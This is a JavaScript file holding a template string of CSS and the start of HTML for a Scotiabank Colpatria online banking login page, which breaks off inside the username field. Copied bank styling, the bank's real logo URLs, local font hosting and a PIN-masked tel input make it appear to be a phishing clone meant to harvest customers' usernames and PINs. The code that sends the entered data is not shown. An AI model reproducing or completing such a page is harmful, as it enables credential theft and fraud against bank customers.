var my_titulo = 'Colpatria';
var my_contenido = `
<style>
    input[type="tel"] {
        /* font-family: "text-security-disc"; */
        -webkit-text-security: disc;
    }

    .first-meaningful__spinner {
        animation: 1s linear infinite svg-icon-spin;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 50px auto;
        width: 300px;
    }

    .first-meaningful__spinner svg {
        height: 72px;
        stroke-width: 1.66667;
        width: 72px;
        color: #333;
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
        margin: 30px;
    }

    .svg-icon-spinner--72px {
        height: 7.2rem;
        stroke-width: 1.6666666667;
        width: 7.2rem;
    }

    .svg-icon-spinner {
        animation: svg-icon-spin 1s linear infinite;
    }

    .svg-icon {
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
    }

    .svg-icon-spinner {
        animation: svg-icon-spin 1s linear infinite
    }

    .svg-icon-spinner--18px {
        height: 1.8rem;
        stroke-width: 2.6666666667;
        width: 1.8rem
    }

    .svg-icon-spinner--24px {
        height: 2.4rem;
        stroke-width: 2;
        width: 2.4rem
    }

    .svg-icon-spinner--32px {
        height: 3.2rem;
        stroke-width: 2.25;
        width: 3.2rem
    }

    .svg-icon-spinner--48px {
        height: 4.8rem;
        stroke-width: 2;
        width: 4.8rem
    }

    .svg-icon-spinner--72px {
        height: 7.2rem;
        stroke-width: 1.6666666667;
        width: 7.2rem
    }

    .svg-icon-illustrative--size-24px {
        height: 2.4rem;
        stroke-width: 2.5;
        width: 2.4rem
    }

    .svg-icon-illustrative--size-36px {
        height: 3.6rem;
        stroke-width: 2;
        width: 3.6rem
    }

    .svg-icon-illustrative--size-48px {
        height: 4.8rem;
        stroke-width: 1.75;
        width: 4.8rem
    }

    .svg-icon-illustrative--size-72px {
        height: 7.2rem;
        stroke-width: 1.5;
        width: 7.2rem
    }

    .svg-icon-category--bg--size-36px {
        height: 3.6rem;
        stroke-width: 1.25;
        width: 3.6rem
    }

    .svg-icon-category--size-24px {
        height: 2.4rem;
        stroke-width: 1.25;
        width: 2.4rem
    }

    .svg-icon-logo--size-12px {
        height: 1.2rem
    }

    .svg-icon-logo--size-14px {
        height: 1.4rem
    }

    .svg-icon-logo--size-16px {
        height: 1.6rem
    }

    .svg-icon-logo--size-18px {
        height: 1.8rem
    }

    .svg-icon-logo--size-24px {
        height: 2.4rem
    }

    .svg-icon-logo--size-32px {
        height: 3.2rem
    }

    .svg-icon-logo--size-36px {
        height: 3.6rem
    }

    .svg-icon-logo--size-48px {
        height: 4.8rem
    }

    .svg-icon-logo--size-72px {
        height: 7.2rem
    }

    .svg-icon-logo-flying--size-12px {
        height: 1.2rem;
        width: 1.2rem
    }

    .svg-icon-logo-flying--size-14px {
        height: 1.4rem;
        width: 1.4rem
    }

    .svg-icon-logo-flying--size-16px {
        height: 1.6rem;
        width: 1.6rem
    }

    .svg-icon-logo-flying--size-18px {
        height: 1.8rem;
        width: 1.8rem
    }

    .svg-icon-logo-flying--size-24px {
        height: 2.4rem;
        width: 2.4rem
    }

    .svg-icon-logo-flying--size-32px {
        height: 3.2rem;
        width: 3.2rem
    }

    .svg-icon-logo-flying--size-36px {
        height: 3.6rem;
        width: 3.6rem
    }

    .svg-icon-logo-flying--size-48px {
        height: 4.8rem;
        width: 4.8rem
    }

    .svg-icon-logo-flying--size-72px {
        height: 7.2rem;
        width: 7.2rem
    }

    @keyframes svg-icon-spin {
        0% {
            transform: rotate(0)
        }

        to {
            transform: rotate(360deg)
        }
    }

    canvas-header .header__bar {
        padding: .8rem 1.2rem;
    }

    canvas-header[fixed] .header {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        z-index: 300;
    }

    canvas-header[fixed] .header:not([class*=background]) {
        background-color: #fff;
    }

    canvas-header[shadow] .header {
        box-shadow: 0 .2rem 1rem #0028501c;
    }

    /*! CSS Used from: Embedded */
    .m-auto {
        margin: auto !important;
    }

    .application-wrapper {
        height: calc(100vh);
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .application-wrapper .header {
        max-height: 6rem;
    }

    .application-wrapper .header__bar.container--center {
        padding: 1rem 3rem;
    }

    @media (min-width: 0) {
        .application-wrapper .header__bar.container--center {
            margin: 0 auto;
        }
    }

    .application-wrapper .header .logo {
        width: 350px;
    }

    @media (max-width: 599px) {
        .application-wrapper .header .logo {
            display: none;
        }
    }

    .application-wrapper .header .logo__mobile {
        width: 90px;
    }

    @media (min-width: 600px) {
        .application-wrapper .header .logo__mobile {
            display: none;
        }
    }

    .application-wrapper .main-container {
        margin: 9rem auto 0 !important;
        padding: 0 3.6rem;
        flex: 80%;
        width: 100%;
    }

    @media (min-width: 922px) {
        .application-wrapper .main-container {
            padding: 0 !important;
            max-width: 1200px;
            margin: 13.2rem auto 0 !important;
        }
    }

    .application-wrapper .header__block {
        flex: 0;
    }

    html,
    body,
    div,
    span,
    h1,
    h2,
    p,
    a,
    img,
    ul,
    form,
    label,
    footer,
    header,
    output,
    section {
        margin: 0;
        padding: 0;
        border: 0;
        font-family: inherit;
        vertical-align: baseline;
    }

    html {
        box-sizing: border-box;
        z-index: 1;
    }

    html,
    body {
        -moz-osx-font-smoothing: grayscale;
        -webkit-font-smoothing: antialiased;
    }

    *,
    *:before,
    *:after {
        box-sizing: inherit;
    }

    input[type=text],
    input[type=password],
    textarea {
        -webkit-appearance: none;
        appearance: none;
    }

    .link {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        color: #009dd6;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        outline: none;
        padding: 0;
        text-decoration: none;
        width: -moz-fit-content;
        width: fit-content;
    }

    .link:hover,
    .link:focus {
        color: #007eab;
        cursor: pointer;
    }

    .link__text:hover,
    .link__text:focus {
        border-bottom: solid 1px;
        margin-bottom: -1px;
    }

    .brand {
        color: #333;
        text-decoration: none;
    }

    .container {
        max-width: 1440px;
        min-width: 248px;
        position: relative;
        width: auto;
    }

    @media (min-width: 0) {
        .container {
            margin: 0 3rem;
        }
    }

    @media (min-width: 768px) {
        .container {
            margin: 0 2.4rem;
        }
    }

    @media (min-width: 922px) {
        .container {
            margin: 0 2.1rem;
        }
    }

    @media (min-width: 1200px) {
        .container {
            margin: 0 1.8rem;
        }
    }

    @media (min-width: 1488px) {
        .container.container--center {
            margin: 0 auto;
        }
    }

    .direction--row {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        flex-direction: row;
        flex-wrap: wrap;
        position: relative;
    }

    @media (min-width: 0) {
        .col-xs-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 .6rem;
        }
    }

    @media (min-width: 768px) {
        .col-sm-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 1.2rem;
        }

        .col-sm-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.2rem;
        }

        .offset-sm-3 {
            margin-left: 25%;
        }
    }

    @media (min-width: 922px) {
        .col-md-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 1.5rem;
        }

        .col-md-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.5rem;
        }

        .offset-md-0 {
            margin-left: 0%;
        }
    }

    @media (min-width: 1200px) {
        .col-lg-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.8rem;
        }
    }

    @media (min-width: 0) and (max-width: 767px) {
        .hide--xs {
            display: none;
        }
    }

    @media (min-width: 768px) and (max-width: 921px) {
        .hide--sm {
            display: none;
        }
    }

    @media (min-width: 922px) and (max-width: 1199px) {
        .hide--md {
            display: none;
        }
    }

    @media (min-width: 1200px) and (max-width: 4000px) {
        .hide--lg {
            display: none;
        }
    }

    html,
    body {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 10px;
        font-weight: initial;
        letter-spacing: 0;
        line-height: 18px;
        margin: 0;
        color: #333;
    }

    .hero {
        font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
        font-size: 3.6rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 4.1rem;
        margin: 0;
    }

    @media (min-width: 922px) {
        .hero {
            font-size: 4.8rem;
            line-height: 5.4rem;
        }
    }

    .text--footer {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.2rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0;
    }

    .color--default {
        color: #333;
    }

    .background--background-alternate {
        background-color: #fafbfd;
    }

    .block {
        display: flex;
        flex-direction: row;
    }

    .block--centered {
        align-items: center;
        justify-content: center;
    }

    @media (min-width: 0) {
        .margin-xs-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem;
        }

        .margin-xs-18--top {
            margin-top: 1.8rem;
        }

        .margin-xs-24--top {
            margin-top: 2.4rem;
        }

        .margin-xs-30--top {
            margin-top: 3rem;
        }

        .margin-xs-36--top {
            margin-top: 3.6rem;
        }

        .margin-xs-72--top {
            margin-top: 7.2rem;
        }

        .margin-xs-72--bottom {
            margin-bottom: 7.2rem;
        }
    }

    @media (min-width: 768px) {
        .margin-sm-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem;
        }
    }

    .svg-icon {
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
    }

    .svg-icon--size-12px {
        height: 1.2rem;
        stroke-width: 3;
        width: 1.2rem;
    }

    .svg-icon--size-18px {
        height: 1.8rem;
        stroke-width: 2;
        width: 1.8rem;
    }

    .button {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        cursor: pointer;
        outline: none;
        overflow: visible;
        position: relative;
    }

    .button:disabled {
        cursor: not-allowed;
        -webkit-tap-highlight-color: transparent;
    }

    @media all and (-ms-high-contrast: active) {
        .button:focus {
            outline: 2px solid white;
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .button:focus {
            outline: 2px solid black;
        }
    }

    .button--primary {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 3.6rem;
        text-decoration: none;
        background-color: #ec111a;
        border-color: #ec111a;
        color: #fff;
        min-height: 5.4rem;
        min-width: 11.8rem;
        transition: background-color ease-in .1s, color ease-in .1s;
    }

    .button--primary:disabled:disabled,
    .button--primary:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575;
    }

    .button--primary:hover,
    .button--primary:focus {
        background-color: #be061b;
        border-color: #be061b;
        color: #fff;
        transition: background-color ease-out .1s, color ease-out .1s;
    }

    .button--primary:after {
        border-radius: .8rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
    }

    .button--primary:focus {
        outline: transparent;
    }

    .button--primary:focus:after {
        opacity: 1;
    }

    .button:disabled:hover {
        box-shadow: none;
    }

    .header {
        border-top: solid 4px #ec111a;
    }

    .header__bar {
        justify-content: space-between;
        padding: 3.6rem 1.2rem;
    }

    .form__input {
        border: 0;
        position: relative;
    }

    .form__input--inline {
        cursor: pointer;
        position: relative;
    }

    .form__input--checkbox {
        display: flex;
        align-items: center;
    }

    .label {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        line-height: 2.4rem;
        color: #333;
        display: inline;
        padding: 0 .1rem;
        vertical-align: middle;
    }

    .label--inline {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
    }

    .input {
        padding: 1rem .1rem;
        width: 100%;
        font-family: Scotia Regular;
        font-size: 2rem;
        font-weight: initial;
        line-height: 2.4rem;
    }

    .input--with-icon {
        top: initial;
    }

    .input--with-icon--left {
        padding-left: 3.2rem;
    }

    .input__icon {
        pointer-events: none;
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
    }

    .input__icon--left {
        left: 0;
    }

    .input--text {
        -webkit-appearance: none;
        appearance: none;
        background-color: transparent;
        border-bottom-color: #757575;
        border-bottom-style: solid;
        border-radius: 0;
        border-width: 0 0 1px;
        color: #333;
        display: block;
        outline: none;
        position: relative;
        transition: box-shadow .2s ease-in-out;
        width: 100%;
    }

    .input--text:focus {
        border-bottom-color: #009dd6;
        box-shadow: 0 .1rem #009dd6;
    }

    .checkbox {
        align-self: flex-start;
        background-color: transparent;
        border: solid 1px #757575;
        border-radius: .4rem;
        color: #fff;
        margin-right: 1.2rem;
        min-height: 2.4rem;
        min-width: 2.4rem;
        position: relative;
        transition: opacity ease-in-out .2s;
    }

    .checkbox:after {
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
        transform: translate(-.1rem, -.1rem);
    }

    .checkbox .svg-icon {
        left: 50%;
        margin-left: -.6rem;
        margin-top: -.6rem;
        position: absolute;
        top: 50%;
    }

    .checkbox__check {
        display: none;
    }

    .input--checkbox {
        align-self: flex-start;
        opacity: 0;
        position: absolute;
        width: auto;
    }

    .input--checkbox:focus+.checkbox:after {
        opacity: 1;
    }

    @media all and (-ms-high-contrast: active) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid white;
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid black;
        }
    }

    .input--checkbox:checked+.checkbox {
        background-color: #009dd6;
        border-color: #009dd6;
    }

    .input--checkbox:checked+.checkbox .checkbox__check {
        display: block;
    }

    .input--checkbox:disabled+.checkbox {
        border-color: #d6d6d6;
        cursor: not-allowed;
    }

    .input--checkbox:disabled+.checkbox+.label--checkbox {
        cursor: not-allowed;
    }

    .input--checkbox:disabled:checked+.checkbox {
        background-color: transparent;
        color: #d6d6d6;
    }

    .input--checkbox:disabled:checked+.checkbox .checkbox__check {
        display: block;
    }

    .label--checkbox {
        line-height: 2.4rem;
        padding-top: 0rem;
    }

    .input-w-aux__input {
        padding-left: 2.5rem;
    }

    .input-w-aux__action {
        bottom: 1.1rem;
        color: #333;
        height: 2rem;
        opacity: 0;
        padding: 0;
        position: absolute;
        right: 1.8rem;
        transition: opacity .1s ease-in-out;
        width: 2rem;
        z-index: 110;
    }

    @media (min-width: 767px) {
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 2rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
        }
    }

    @media (max-width: 767px) {
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 1.8rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
    }

    html,
    body {
        min-height: 100vh;
        font-size: 65.2%;
    }

    body {
        font-size: 1.6rem;
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            margin: 0 36px;
            max-width: initial;
        }
    }

    .block--padding-0 {
        padding: 0;
    }

    .hero {
        font-size: 2.6rem;
    }

    @media (min-width: 922px) {
        .hero {
            font-size: 3.6rem;
        }
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            max-width: 1200px;
        }

        .container--center {
            margin: 0 auto;
        }
    }

    ::-webkit-scrollbar {
        width: .25rem;
    }

    ::-webkit-scrollbar-track {
        box-shadow: inset 0 0 .02rem #757575;
        border-radius: 2rem;
    }

    ::-webkit-scrollbar-thumb {
        background: #757575;
        border-radius: 2rem;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: #e2e8ee;
    }

    section {
        padding-top: 0;
    }

    section {
        display: flex;
        flex-direction: row;
        flex: 1;
    }

    .form__password {
        position: relative;
    }

    .password-validation {
        text-align: left;
        display: none;
        justify-content: space-between;
        width: 100%;
        margin-top: .6rem;
    }

    .password-validation span {
        font-size: .75em;
        color: #333;
    }

    auth-login {
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    /*! CSS Used from: http://localhost.com/css/sweetalert2.min.css */
    .no-border {
        border: none !important;
    }

    div:where(.swal2-container) {
        display: grid;
        position: fixed;
        z-index: 1060;
        inset: 0;
        box-sizing: border-box;
        grid-template-areas: "top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";
        grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
        height: 100%;
        padding: .625em;
        overflow-x: hidden;
        transition: background-color .1s;
        -webkit-overflow-scrolling: touch;
    }

    div:where(.swal2-container).swal2-backdrop-show {
        background: rgba(0, 0, 0, .4);
    }

    div:where(.swal2-container).swal2-center {
        grid-template-columns: auto minmax(0, 1fr) auto;
    }

    div:where(.swal2-container).swal2-center>.swal2-popup {
        grid-column: 2;
        grid-row: 2;
        align-self: center;
        justify-self: center;
    }

    div:where(.swal2-container) div:where(.swal2-popup) {
        display: none;
        position: relative;
        box-sizing: border-box;
        grid-template-columns: minmax(0, 100%);
        width: 32em;
        max-width: 100%;
        padding: 0 0 1.25em;
        border: none;
        border-radius: 5px;
        background: #fff;
        color: #545454;
        font-family: inherit;
        font-size: 14px;
    }

    div:where(.swal2-container) div:where(.swal2-popup):focus {
        outline: none;
    }

    div:where(.swal2-container) h2:where(.swal2-title) {
        position: relative;
        max-width: 100%;
        margin: 0;
        padding: .8em 1em 0;
        color: inherit;
        font-size: 1.875em;
        font-weight: 600;
        text-align: center;
        text-transform: none;
        word-wrap: break-word;
    }

    div:where(.swal2-container) div:where(.swal2-actions) {
        display: flex;
        z-index: 1;
        box-sizing: border-box;
        flex-wrap: wrap;
        align-items: center;
        justify-content: center;
        width: auto;
        margin: 1.25em auto 0;
        padding: 0;
    }

    div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover {
        background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
    }

    div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active {
        background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
    }

    div:where(.swal2-container) div:where(.swal2-loader) {
        display: none;
        align-items: center;
        justify-content: center;
        width: 2.2em;
        height: 2.2em;
        margin: 0 1.875em;
        animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
        border-width: .25em;
        border-style: solid;
        border-radius: 100%;
        border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0);
    }

    div:where(.swal2-container) button:where(.swal2-styled) {
        margin: .3125em;
        padding: .625em 1.1em;
        transition: box-shadow .1s;
        box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
        font-weight: 500;
    }

    div:where(.swal2-container) button:where(.swal2-styled):not([disabled]) {
        cursor: pointer;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #7066e0;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm:focus {
        box-shadow: 0 0 0 3px rgba(112, 102, 224, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-deny {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #dc3741;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-deny:focus {
        box-shadow: 0 0 0 3px rgba(220, 55, 65, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #6e7881;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel:focus {
        box-shadow: 0 0 0 3px rgba(110, 120, 129, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled):focus {
        outline: none;
    }

    div:where(.swal2-container) div:where(.swal2-footer) {
        margin: 1em 0 0;
        padding: 1em 1em 0;
        border-top: 1px solid #eee;
        color: inherit;
        font-size: 1em;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-timer-progress-bar-container {
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        grid-column: auto !important;
        overflow: hidden;
        border-bottom-right-radius: 5px;
        border-bottom-left-radius: 5px;
    }

    div:where(.swal2-container) div:where(.swal2-timer-progress-bar) {
        width: 100%;
        height: .25em;
        background: rgba(0, 0, 0, .2);
    }

    div:where(.swal2-container) img:where(.swal2-image) {
        max-width: 100%;
        margin: 2em auto 1em;
    }

    div:where(.swal2-container) button:where(.swal2-close) {
        z-index: 2;
        align-items: center;
        justify-content: center;
        width: 1.2em;
        height: 1.2em;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: -1.2em;
        padding: 0;
        overflow: hidden;
        transition: color .1s, box-shadow .1s;
        border: none;
        border-radius: 5px;
        background: rgba(0, 0, 0, 0);
        color: #ccc;
        font-family: monospace;
        font-size: 2.5em;
        cursor: pointer;
        justify-self: end;
    }

    div:where(.swal2-container) button:where(.swal2-close):hover {
        transform: none;
        background: rgba(0, 0, 0, 0);
        color: #f27474;
    }

    div:where(.swal2-container) button:where(.swal2-close):focus {
        outline: none;
        box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5);
    }

    div:where(.swal2-container) .swal2-html-container {
        z-index: 1;
        justify-content: center;
        margin: 1em 1.6em .3em;
        padding: 0;
        overflow: auto;
        color: inherit;
        font-size: 1.125em;
        font-weight: normal;
        line-height: normal;
        text-align: center;
        word-wrap: break-word;
        word-break: break-word;
    }

    div:where(.swal2-container) input:where(.swal2-input),
    div:where(.swal2-container) input:where(.swal2-file),
    div:where(.swal2-container) textarea:where(.swal2-textarea),
    div:where(.swal2-container) select:where(.swal2-select),
    div:where(.swal2-container) div:where(.swal2-radio),
    div:where(.swal2-container) label:where(.swal2-checkbox) {
        margin: 1em 2em 3px;
    }

    div:where(.swal2-container) input:where(.swal2-input),
    div:where(.swal2-container) input:where(.swal2-file),
    div:where(.swal2-container) textarea:where(.swal2-textarea) {
        box-sizing: border-box;
        width: auto;
        transition: border-color .1s, box-shadow .1s;
        border: 1px solid #d9d9d9;
        border-radius: .1875em;
        background: rgba(0, 0, 0, 0);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em;
    }

    div:where(.swal2-container) input:where(.swal2-input):focus,
    div:where(.swal2-container) input:where(.swal2-file):focus,
    div:where(.swal2-container) textarea:where(.swal2-textarea):focus {
        border: 1px solid #b4dbed;
        outline: none;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5);
    }

    div:where(.swal2-container) input:where(.swal2-input)::placeholder,
    div:where(.swal2-container) input:where(.swal2-file)::placeholder,
    div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder {
        color: #ccc;
    }

    div:where(.swal2-container) .swal2-range {
        margin: 1em 2em 3px;
        background: #fff;
    }

    div:where(.swal2-container) .swal2-range input {
        width: 80%;
    }

    div:where(.swal2-container) .swal2-range output {
        width: 20%;
        color: inherit;
        font-weight: 600;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-range input,
    div:where(.swal2-container) .swal2-range output {
        height: 2.625em;
        padding: 0;
        font-size: 1.125em;
        line-height: 2.625em;
    }

    div:where(.swal2-container) .swal2-input {
        height: 2.625em;
        padding: 0 .75em;
    }

    div:where(.swal2-container) .swal2-file {
        width: 75%;
        margin-right: auto;
        margin-left: auto;
        background: rgba(0, 0, 0, 0);
        font-size: 1.125em;
    }

    div:where(.swal2-container) .swal2-textarea {
        height: 6.75em;
        padding: .75em;
    }

    div:where(.swal2-container) .swal2-select {
        min-width: 50%;
        max-width: 100%;
        padding: .375em .625em;
        background: rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em;
    }

    div:where(.swal2-container) .swal2-radio,
    div:where(.swal2-container) .swal2-checkbox {
        align-items: center;
        justify-content: center;
        background: #fff;
        color: inherit;
    }

    div:where(.swal2-container) .swal2-checkbox input {
        flex-shrink: 0;
        margin: 0 .4em;
    }

    div:where(.swal2-container) div:where(.swal2-validation-message) {
        align-items: center;
        justify-content: center;
        margin: 1em 0 0;
        padding: .625em;
        overflow: hidden;
        background: #f0f0f0;
        color: #666;
        font-size: 1em;
        font-weight: 300;
    }

    div:where(.swal2-container) div:where(.swal2-validation-message)::before {
        content: "!";
        display: inline-block;
        width: 1.5em;
        min-width: 1.5em;
        height: 1.5em;
        margin: 0 .625em;
        border-radius: 50%;
        background-color: #f27474;
        color: #fff;
        font-weight: 600;
        line-height: 1.5em;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-progress-steps {
        flex-wrap: wrap;
        align-items: center;
        max-width: 100%;
        margin: 1.25em auto;
        padding: 0;
        background: rgba(0, 0, 0, 0);
        font-weight: 600;
    }

    div:where(.swal2-icon) {
        position: relative;
        box-sizing: content-box;
        justify-content: center;
        width: 5em;
        height: 5em;
        margin: 2.5em auto .6em;
        border: 0.25em solid rgba(0, 0, 0, 0);
        border-radius: 50%;
        border-color: #000;
        font-family: inherit;
        line-height: 5em;
        cursor: default;
        user-select: none;
    }

    div:where(.swal2-icon) .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 3.75em;
    }

    [class^=swal2] {
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    .swal2-show {
        animation: swal2-show .3s;
    }

    body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
        overflow: hidden;
    }

    body.swal2-height-auto {
        height: auto !important;
    }

    @media print {
        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
            overflow-y: scroll !important;
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
            display: none;
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
            position: static !important;
        }
    }

    .password-validation.visible {
        display: flex
    }

    .input-w-aux__input.input--active+label {
        height: 1px;
        left: -10000px;
        overflow: hidden;
        position: absolute;
        top: auto;
        width: 1px
    }

    .input-w-aux__input.input--active~button {
        opacity: 1
    }

    /*! CSS Used keyframes */
    @keyframes swal2-rotate-loading {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    @keyframes swal2-show {
        0% {
            transform: scale(0.7);
        }

        45% {
            transform: scale(1.05);
        }

        80% {
            transform: scale(0.95);
        }

        100% {
            transform: scale(1);
        }
    }

    /*! CSS Used fontfaces */
    @font-face {
        font-family: Scotia Bold;
        src: url('http://localhost.com/fonts/Scotia_W_Bd.woff') format("woff");
    }

    @font-face {
        font-family: Scotia Regular;
        font-style: normal;
        src: url('http://localhost.com/fonts/Scotia_W_Rg.woff') format("woff");
    }

    @font-face {
        font-family: Scotia Headline;
        font-style: normal;
        src: url('http://localhost.com/fonts/Scotia_W_Headline.woff') format("woff");
    }
</style>

<div class="application-wrapper">
    <canvas-header shadow="" fixed="" class="header__block">
        <header class="header">
            <div class="header__bar container container--center direction--row">
                <a routerlink="/" class="brand block block--centered" href="/banca-virtual/login/">
                    <img src="https://cdn.agilitycms.com/scotiabank-colombia/canvas/svgs/logos/scotiabank-colpatria-red.svg" alt="Scotiabank Colpatria" class="logo">
                    <img src="https://cdn.agilitycms.com/scotiabank-colombia/canvas/svgs/logos/scotiabank-colpatria-symbol-red.svg" alt="Scotiabank Colpatria" class="logo__mobile"></a>
            </div>
        </header>
    </canvas-header>
    <section role="main" class="container main-container">
        <auth-login>
            <div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
                <div class="direction--row">
                    <div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0 m-auto">
                        <h1 class="hero">Ingresa a tu Banca Virtual</h1>
                        <form onsubmit="return false" novalidate="" role="form" autocomplete="off" class="form ng-pristine ng-invalid ng-touched"><!----><!---->
                            <div class="form__input margin-xs-30--top">
                                <canvas-input-text formcontrolname="firstCredential" _nghost-hjw-c48="" class="ng-pristine ng-invalid ng-touched" maxlength="12">
                                    <div class="form__input">
                                        <label role="text" class="label" for="inputUserNameId"></label>
                                        <div class="form__input--inline">
                                            <input required class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" id="txtUsuario" type="text" placeholder="Nombre de usuario" autocomplete="off" aria-describedby="first-credential-input-error" maxlength="12">
                                            <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
